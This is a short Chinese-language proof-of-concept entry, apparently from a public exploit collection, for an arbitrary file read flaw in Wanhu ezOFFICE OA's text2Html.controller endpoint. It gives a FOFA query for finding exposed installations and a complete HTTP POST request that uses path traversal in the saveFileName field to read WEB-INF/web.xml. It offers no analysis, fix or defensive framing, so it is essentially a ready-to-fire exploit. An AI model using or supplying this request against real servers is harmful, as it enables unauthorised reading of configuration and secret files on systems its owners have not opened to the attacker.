## 万户OA text2Html接口存在任意文件读取漏洞

## fofa
```
app="万户网络-ezOFFICE"
```

## poc
```
POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
Host:  
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Length: 63
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
SL-CE-SUID: 1081

saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
```

![e776895b9471c04a60d74a1666b56e1b](https://github.com/wy876/POC/assets/139549762/8217e88a-f2f5-47ba-9c27-eb765cbbed78)
